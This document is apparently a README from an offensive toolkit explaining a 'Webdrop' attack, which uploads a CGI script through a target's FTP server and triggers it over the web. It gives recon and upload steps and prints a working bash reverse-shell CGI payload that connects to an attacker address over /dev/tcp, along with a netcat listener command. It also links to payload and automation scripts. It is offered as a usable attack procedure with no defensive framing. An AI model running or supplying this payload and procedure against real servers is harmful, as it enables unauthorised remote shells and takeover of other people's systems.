# Webdrop Exploit
Webdrop is an exploit that takes advantage of a server using both FTP and a web server.
It involves uploading a reverse shell CGI script to the target, and then triggering it with a request to that site.

## Using This Exploit
The exploit can be done manually in a few steps.

### Recon
Use a port scan to check if port 21 + 80/8080/443/8443 is open.
If the target is using these ports, it may be vulnerable.
Not all servers with these ports open will be vulnerable, sometimes this exploit requires privlages to write to certain locations, and CGI script will need to be allowed.
Use kiwi's portscanner with the webdrop scan file for a quick check.
```bash
./portscanner TARGETIP webdrop
```

### Uploading CGI Script
Once you have access to the FTP server, then attempt to upload the file to various CGI script locations including:
- /usr/lib/cgi-bin
- /var/www/html
- Other locations you find manually that might allow you to access the contents from a browser.
This part may require the FTP server to have high permission levels, so the exploit will not work if you can't upload the script in this step.
Your CGI script can be custom created, or you can use the payload found in the rshell folder of the payloads folder.<br>
Example payload to cause a reverse shell:
```bash
#!/bin/bash
echo "Content-Type: text/html"
bash -i >& /dev/tcp/ATTACKERIP/1337 0>&1
```
With enough privlages to write to the targets FTP server, you will be able to upload any script you want. For this example, a reverse shell script is used.
Make sure to start a reverse shell listener for this attack.
```bash
nc -lvnp 1337
```

### Triggering the Script
You can trigger the script by visiting the website, or sending a curl request to it.

## Resources
Payload: [Reverse Shell Bash CGI Script](../../payload/rshell/cgibash.sh)
Scanfile for Webdrop: [Webdrop Scanfile for Kiwi Portscanner](../../recon/portscanner/webdrop)
Python Automation Script: [Webdrop Automated with Python](webdrop.py)
